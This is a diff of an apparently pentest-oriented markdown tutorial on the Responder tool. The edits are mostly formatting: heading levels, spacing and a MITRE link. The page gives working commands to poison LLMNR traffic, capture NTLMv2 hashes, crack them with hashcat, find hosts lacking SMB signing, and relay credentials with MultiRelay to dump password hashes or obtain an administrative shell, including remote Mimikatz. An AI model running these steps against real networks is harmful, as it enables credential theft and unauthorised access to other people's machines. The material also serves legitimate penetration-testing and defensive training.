@@ -5,7 +5,7 @@ tags: [responder, credential access (TA0006), llmnr, nbt-ns, mdns, aitm, mitm, h
 comments: true
 ---
 
-# Overview
+## Overview
 
 Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
 
@@ -13,9 +13,9 @@ Responder come packaged with Kali Linux by default. [^1]
 
 | Tool Name | Version | MITRE ATT&CK Tactic | MITRE ATT&CK Technique |
 | --------- | ------- | ------------------- | ---------------------- |
-| [Responder.py](https://github.com/lgandx/Responder) | v3.1.3.0 | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Adversary-in-the-Middle]() |
+| [Responder.py](https://github.com/lgandx/Responder) | v3.1.3.0 | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) |
 
-# Responder Help Page
+## Responder Help Page
 
 ```bash
                                          __
@@ -76,11 +76,12 @@ Options:
   --disable-ess         Force ESS downgrade. Default: False
   -v, --verbose         Increase verbosity.
 ```
+
 {: .nolineno }
 
-# Instructions
+## Instructions
 
-## Using Responder to Perform LLMNR Poisoning
+### Using Responder to Perform LLMNR Poisoning
 
 Execute the below command on the attacker machine. Ensure that the `-I` switch is set to interface that is on the same network as the target.
 
@@ -88,20 +89,22 @@ Execute the below command on the attacker machine. Ensure that the `-I` switch i
 # Running the listener will wait for a host to make a request
 sudo responder -I ens33 -wd
 ```
+
 {: .nolineno }
 
 Once a set of NTLMv2 credentials have been collection, the password can be attempted to be cracked.
 
-### Cracking NTLMv2 Credentials with HashCat
+#### Cracking NTLMv2 Credentials with HashCat
 
 With the previously obtained NTLMv2 credential hash collected and saved to a text file. It can be parsed through a credential cracking utility such as hashcat.
 
 ```bash
 hashcat -m 5600 -a 0 /PATH/TO/DUMP.txt /usr/share/wordlists/rockyou.txt 
 ```
+
 {: .nolineno }
 
-## Using Responder-Finger and Responder-MultiRelay
+### Using Responder-Finger and Responder-MultiRelay
 
 Responder comes packaged with additional tools can be used together with Responder to perform other tasks, such as relaying NTLMv2 credentials to gain authenticated access via SMB without the requirement to crack a collected NTLMv2 password hash. The below example shows how to identify systems that don't require SMB signing (a requirement for this method to work) using `Responder-Finger` and setup the `Responder-MultRelay` to gain authenticated access to another host. Local Administrative privileges is however a requirement for the process to work.
 
@@ -119,6 +122,7 @@ This will require three hosts; the attacker, the requesting LLMNR victim, and th
     ```bash
     sudo responder -I ens33 -wd
     ```
+
     {: .nolineno }
 
 3. Identify hosts on the target network that have SMB signing disabled, the `-i` switch requires the subnet to search. Once the results are returned, identify any hosts that return `SMB signing: False`. If none are returned, this method will not work and NTLMv2 credentials will need to be cracked instead.
@@ -126,6 +130,7 @@ This will require three hosts; the attacker, the requesting LLMNR victim, and th
     ```bash
     sudo responder-RunFinger.py -i 10.10.10.1/24
     ```
+
     {: .nolineno }
 
 4. Start the MultiRelay to relay the NTLMv2 credentials to any target host identified in step 3. In this example, `10.10.10.10` was identified to have SMB signing disabled and is therefore used as the target `-t`. The `-d` switch will instruct the MultiRelay tool to dump the local password hashes. The `-d` switch can be omitted which will instead return an administrative shell to the target machine.
@@ -133,6 +138,7 @@ This will require three hosts; the attacker, the requesting LLMNR victim, and th
     ```bash
     sudo responder-MultiRelay.py -t 10.10.10.10 -u ALL -d
     ```
+
     {: .nolineno }
 
 5. If the `-d` switch was omitted in step 4, an interactive shell will be returned allowed the following commands.
@@ -147,7 +153,8 @@ This will require three hosts; the attacker, the requesting LLMNR victim, and th
    - scan: Performs a scan using SMB for other local targets (use /24 or /26 to limit scope)
    - mimi: Run a remote Mimikatz 64 command
    - mimi32: Run a remote Mimikatz 32 command
-   - lcmd: Run a local command 
+   - lcmd: Run a local command
 
-# Sources
+## Sources
+
 [^1]: [Kali - Responder](https://www.kali.org/tools/responder/)
